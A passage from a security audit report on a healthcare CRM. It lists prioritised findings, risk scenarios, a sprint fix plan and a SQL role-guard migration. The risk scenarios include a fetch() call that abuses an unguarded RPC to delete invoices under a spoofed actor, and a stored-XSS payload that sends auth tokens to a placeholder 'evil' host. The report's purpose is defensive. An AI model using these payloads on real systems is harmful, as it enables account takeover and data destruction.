- **P2** `updated_at` triggers missing on `hh_attendance`, `hh_ai_conversations`, `hh_ai_messages`, `hh_duties`, `hh_payouts`, `hh_whatsapp_messages`.
- **P2** Duplicate / redundant indexes: `hh_receipts_billing_id_idx`, `idx_hh_receipts_billing_visible`, `hh_payout_charges_partner_id_idx`, `idx_hh_duties_employee`, `idx_hh_idempotency_created` (one of the two).
- **P2** Six duplicate-phone groups in `hh_employees` (across active/inactive) — legitimate rehires but masks data-entry error.
- **P2** `payoutValidation.ts:82-87` — `proof_bucket` / `proof_path` not validated against `ALLOWED_BUCKETS` in schema.

**Security**:

- **P2** HSTS missing `includeSubDomains; preload`. (Subagent claim "missing entirely" was wrong; verified present, 2-year max-age.)
- **P2** CSP `img-src 'self' data: blob: https:` permits any HTTPS image.
- **P2** Upload extension filter is a denylist (`.html`, `.svg`, `.js`); should be allowlist (`.jpg`, `.jpeg`, `.png`, `.webp`, `.pdf`).
- **P2** Sentry major (10.x) upgrade pending — current `9.47.1` pulls transitive `uuid < 11.1.1` (moderate advisory).
- **P2** `lib/api/security.ts:41-47` — `clientIpFromRequest` trusts `x-forwarded-for` left-most IP; on Vercel right-most is canonical.

**Mobile**:

- **P2** Multiple findings already enumerated above.

---

## P3 — Polish (24 items, abbreviated)

- Dashboard stat cards render "—" both during load and on error.
- Print + Clear buttons missing busy guards on several pages.
- `lib/print.js:69-77` — 5 s fallback `setTimeout` never cleared.
- `app/payouts/payouts-inner.js:251-274` — `openPayout` auto-opens advance form (footgun).
- `requireRole` echoes the role list to client (`"Requires role: Admin | Manager | Accountant"`).
- `Math.random()`-derived business IDs (`lib/api/ids.ts:20`, `src/business/idRules.ts:20`) — switch to `crypto.randomInt()`.
- `lib/api/errors.ts:64-70` — In non-production returns raw `err.message`.
- 50 unused indexes flagged by performance advisor (re-check in 30 days).
- Auth connection pool set to absolute 10 connections; switch to percentage-based.
- Sentry breadcrumbs disabled correctly (`sendDefaultPii: false`) — verified clean.
- ... 14 more polish items (see subagent reports in the conversation transcript for full enumeration).

---

# 2. PRODUCTION RISKS (Real-world scenarios)

These are the failure modes a real incident response team would write up.

### Risk 1 — Junior employee deletes an invoice (P0-2)
A `Nurse` opens DevTools, copies their access token, and runs:
```js
fetch('https://hkyjxdmkqkydnrafhpgn.supabase.co/rest/v1/rpc/hominal_delete_invoice',
  { method:'POST', headers:{Authorization:'Bearer '+TOKEN, 'Content-Type':'application/json', apikey:ANON},
    body: JSON.stringify({ p_invoice_id: 'INV...', p_actor: 'admin@x.com' }) });
```
PostgREST routes to the SECURITY DEFINER function, which has no role guard. The invoice is gone. Audit shows `actor=admin@x.com`. The real culprit is invisible.

### Risk 2 — `admin@hominalhealthcare.com / admin123` works (P0-1 + P1-38)
Anyone reading the JS bundle (anyone visiting `/`) sees the literal `admin123`. If the password is currently set in Supabase Auth (please check), the attacker logs in as admin and exfiltrates the full database via RLS-bypassing service-role-protected RPCs (P0-2).

### Risk 3 — Double-click on a slow night creates duplicate receipts (P0-3)
At 22:00, network slow; receptionist clicks "Save receipt" twice. The React app fires two POSTs, no Idempotency-Key, both succeed. `hh_receipts` now has two rows for ₹2,000 when only ₹2,000 was paid. The bill's `paid_status` recompute happens twice; the receipt_no sequence advances twice. Manual reconciliation next morning.

### Risk 4 — Stored XSS in patient name takes over every operator (P1-7)
A malicious staff member edits a patient record:
```
Name: <img src=x onerror=fetch('//evil/?t='+localStorage.getItem('sb-...-auth-token'))>
```
Every other operator who opens the patient list ships their Supabase access token to `evil`. Attacker now has full operator access, including service-role RPC abuse (P0-2).

### Risk 5 — DBA runs `DELETE FROM hh_billings WHERE id='...'` in incident response (P1-4)
All receipts, invoices, and service entries for that billing are silently wiped via `ON DELETE CASCADE`. Audit log retains a delete row for the billing but the receipt history is gone.

### Risk 6 — Patient closed; duty diary still bills them (P0-5)
Operator closes patient X. Next month's duty diary materialises 30 service entries against X's still-open billing. Invoice generated. Patient family disputes. Audit shows nobody touched the duties.

### Risk 7 — Preview deployment fires the cron mutation (P0-4 + P1-9)
A branch deploy on `preview-*-vercel.app` is publicly reachable. Curl `/api/v1/cron/duties-extend` runs; service-role mutates real `hh_payouts` and `hh_duty_days`. Production data drifts.

### Risk 8 — Operator on the road loses offline mutations (P1-3)
Field nurse marks 12 attendance rows offline. App returns to online; nothing flushes because the listener is only on auth state. Nurse closes the tab. 12 attendance rows lost.

### Risk 9 — Field nurse cannot use phone (P1-6 + P1-30 + P1-31)
Mobile viewport meta missing → 980px desktop layout. Modals tall enough to push Save off-screen. Form labels not associated → tap-to-focus doesn't work. Field nurse abandons mobile use.

### Risk 10 — End-of-month invoice missing the last day's duties (P1-20)
On 31 January, IST duties starting after 18:30 fall outside the calendar query window. Operator generates monthly invoice without those duties. Client undercharged.

---

# 3. RECOMMENDED FIX ORDER

### Sprint 1 (this week — close every P0)
| # | Item | Owner | Effort |
|---|---|---|---|
| 1 | Delete `admin123` branches in `public/legacy-crm.html`; rotate Supabase Auth password | Backend | 30 min |
| 2 | Migration: add `hh_has_role(...)` guards to 7 destructive RPCs (Appendix A) | DB | 1 h |
| 3 | Patch `lib/api-client.js` + `lib/api/idempotency.ts` for synthesized Idempotency-Key | Backend | 3 h |
| 4 | Cron route: refuse to run without secret regardless of env | Backend | 15 min |
| 5 | RPC `hominal_close_patient` for cascading soft-close | Backend + DB | 3 h |
| 6 | Tighten `idSchema` + repository `q` sanitisation | Backend | 2 h |
| 7 | `signed-download` route: `requireRole` + lower TTL to 30 min | Backend | 30 min |

### Sprint 2 (next sprint — close P1s 1-15)
- Realtime race fix in `use-realtime-resource.js`
- `openPayout` request-token guard
- Online + visibilitychange listeners for offline queue; 5xx enqueue
- `ON DELETE CASCADE → RESTRICT` migration on 4 financial FKs
- Client-side validation pass (Aadhar/PAN/phone/DOB + mobile keyboards)
- Add `viewport` export to `app/layout.js`
- Replace `innerHTML` with `safeText()` in `legacy-crm.html` (or retire iframe)
- Drop `'unsafe-eval'` from CSP
- `hh_recompute_payout` + `hh_convert_inquiry_to_patient` row-lock fixes
- CHECK + NOT NULL on `hh_billings.status` and `hh_payouts.status`
- `hh_lookup_login` → boolean + rate-limit
- WhatsApp send role-tighten + recipient allow-list

### Sprint 3 (P1s 16-38)
- Server-side login proxy with rate limit (Vercel KV)
- Receipt save → single atomic RPC
- Bill generation from duty range → single RPC
- TZ fixes (`crmTodayIso()` everywhere)
- IST end-of-month boundary fix in `duties/page.js`
- N+1 query batching
- Modal `max-height/overflow-y` + label `htmlFor`
- PDF popup-blocker fix (synchronous `window.open`)
- All `parseJsonBody().catch(() => ({}))` → let 400 propagate

### Sprint 4 (P2 batch — UX and maintenance debt)
Schedule once P0/P1 are out the door. Most P2s are mechanical.

---

# 4. PRODUCTION HEALTH (live, 28 May 2026 10:00 IST)

```
root=307  t=0.22s
login=200 t=0.29s
/api/v1/health → success: true, supabase.ok: true, openai: false, whatsapp: false, sentry: false
content-security-policy: ... script-src 'self' 'unsafe-inline' 'unsafe-eval'; ... frame-ancestors 'none'
referrer-policy: strict-origin-when-cross-origin
strict-transport-security: max-age=63072000
x-content-type-options: nosniff
x-frame-options: DENY
DB size: 474 MB
Tables with > 1000 dead tuples: 0 (no bloat)
Orphan FKs (4 probed): 0
Bad-amount receipts: 0
Future DOBs: 0
Inverted duty dates: 0
Duplicate active Aadhar groups: 0
```

System is **operational**, but is one credential-stuffing attempt away from a P0 incident.

---

# Appendix A — Migration draft for P0-2 (RPC role guards)

```sql
-- 20260528100000_rpc_role_guards.sql
begin;

create or replace function public._hh_require_role(p_roles text[]) returns void
language plpgsql security definer set search_path = public as $$
begin
  if not hh_has_role(p_roles) then
    raise exception 'forbidden' using errcode = '42501', message = 'insufficient role';
  end if;
end $$;

create or replace function public.hominal_delete_invoice(p_invoice_id text, p_actor text)
returns jsonb language plpgsql security definer set search_path = public as $$
begin
  perform public._hh_require_role(array['Admin','Accountant','Manager']);
  -- ... existing body ...
end $$;

-- repeat for: hominal_flip_billing_status, hominal_soft_delete_receipt,
--             hominal_save_receipt, hh_recompute_payout,
--             hh_compact_invoice_seq, hh_convert_inquiry_to_patient
-- with appropriate role lists per function.

commit;
```

Cap the role list per function:
- `hominal_delete_invoice`, `hominal_flip_billing_status`, `hominal_soft_delete_receipt`, `hh_recompute_payout`, `hh_compact_invoice_seq` → `['Admin','Accountant','Manager']`
- `hominal_save_receipt` → `['Admin','Accountant','Manager','Staff']` (receipts are recorded by reception)
- `hh_convert_inquiry_to_patient` → `['Admin','Manager','Staff']`

---

# Appendix B — Subagent reports (raw evidence)

Full per-category findings with every `file:line` citation are in this conversation's transcript. This audit synthesises them, verifies the highest-severity claims directly (via `pg_proc`, file read, live HTTPS), and corrects two false positives (HSTS / `.env` git tracking).

---

*End of report. 120 issues catalogued. 7 P0. 38 P1. Score 68/100. Production-ready for the current customer with caution; not ready for new customers until at least every P0 is closed.*
